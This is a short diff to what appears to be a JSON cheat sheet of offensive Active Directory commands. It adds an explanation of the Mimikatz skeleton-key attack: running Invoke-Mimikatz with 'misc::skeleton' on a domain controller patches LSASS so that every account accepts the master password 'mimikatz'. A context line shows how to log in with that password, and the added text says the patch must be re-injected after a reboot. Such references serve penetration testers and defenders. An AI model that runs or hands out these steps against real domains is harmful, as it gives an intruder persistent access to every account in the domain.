@@ -110,5 +110,6 @@
       "label": "Then auth with the master password 'mimikatz'",
       "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz"
     }
-  ]
+  ],
+  "explain": "Patches LSASS on a DC to add a master password that authenticates as ANY account alongside its real one:\n  Invoke-Mimikatz          run Mimikatz remotely\n  -Command '\"misc::skeleton\"'   inject the skeleton key into lsass on the DC\n  -ComputerName <dc_host>  the Domain Controller to patch (needs DA + code exec on the DC)\nAfterwards any user logs on with the password 'mimikatz' (or their own). It lives only in memory, so it does NOT survive a DC reboot - re-inject as needed."
 }
